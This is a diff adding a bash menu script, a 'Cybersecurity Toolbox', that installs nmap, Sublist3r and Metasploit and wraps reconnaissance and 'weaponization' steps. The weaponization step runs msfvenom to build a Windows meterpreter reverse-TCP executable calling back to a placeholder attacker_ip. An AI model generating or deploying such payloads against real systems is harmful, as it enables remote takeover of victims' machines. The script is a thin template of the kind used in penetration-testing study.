@@ -1,0 +1,82 @@
+#!/bin/bash
+
+# Check if script is run as root
+if [ "$(id -u)" != "0" ]; then
+    echo "This script must be run as root. Please use 'sudo su' to execute it."
+    exit 1
+fi
+
+# Color codes for enhancing output
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[0;33m'
+NC='\033[0m' # No Color
+
+# Function to install and configure tools
+install_and_configure_tools() {
+    clear
+    echo -e "${GREEN}Installing and configuring tools...${NC}"
+    # Install necessary tools with sudo
+    apt-get update
+    apt-get install -y nmap sublist3r metasploit-framework
+
+    # Configure tools, if required
+    echo -e "${YELLOW}Configuring Metasploit...${NC}"
+    msfdb init
+
+    echo -e "${GREEN}Tools installation and configuration complete.${NC}"
+    read -n 1 -s -r -p "Press any key to continue..."
+}
+
+# Function to perform reconnaissance
+perform_reconnaissance() {
+    clear
+    echo -e "${GREEN}Performing reconnaissance...${NC}"
+    # Add multiple commands for reconnaissance here
+    echo -e "${YELLOW}Scanning for open ports with Nmap...${NC}"
+    nmap -p 1-100 target_ip
+    echo -e "${YELLOW}Enumerating subdomains with Sublist3r...${NC}"
+    sublist3r -d example.com  # Sublist3r doesn't require sudo
+    echo -e "${GREEN}Reconnaissance complete.${NC}"
+    read -n 1 -s -r -p "Press any key to continue..."
+}
+
+# Function to perform weaponization
+perform_weaponization() {
+    clear
+    echo -e "${GREEN}Performing weaponization...${NC}"
+    # Add multiple commands for weaponization here
+    echo -e "${YELLOW}Generating malicious payload with Metasploit...${NC}"
+    msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe -o payload.exe  # msfvenom doesn't require sudo
+    echo -e "${GREEN}Weaponization complete.${NC}"
+    read -n 1 -s -r -p "Press any key to continue..."
+}
+
+# Function to display the main menu
+display_menu() {
+    clear
+    echo -e "${GREEN}==== Cybersecurity Toolbox ====${NC}"
+    echo "1. Install and Configure Tools"
+    echo "2. Perform Reconnaissance"
+    echo "3. Perform Weaponization"
+    echo "4. Quit"
+}
+
+# Main function to start the script
+main() {
+    echo -e "${GREEN}Welcome to the Cybersecurity Toolbox!${NC}"
+    while true; do
+        display_menu
+        read -p "Enter your choice: " choice
+        case $choice in
+            1) install_and_configure_tools ;;
+            2) perform_reconnaissance ;;
+            3) perform_weaponization ;;
+            4) clear; echo "Exiting..."; break ;;
+            *) echo -e "${RED}Invalid choice. Please enter a number from 1 to 4.${NC}" ;;
+        esac
+    done
+}
+
+# Execute the main function
+main
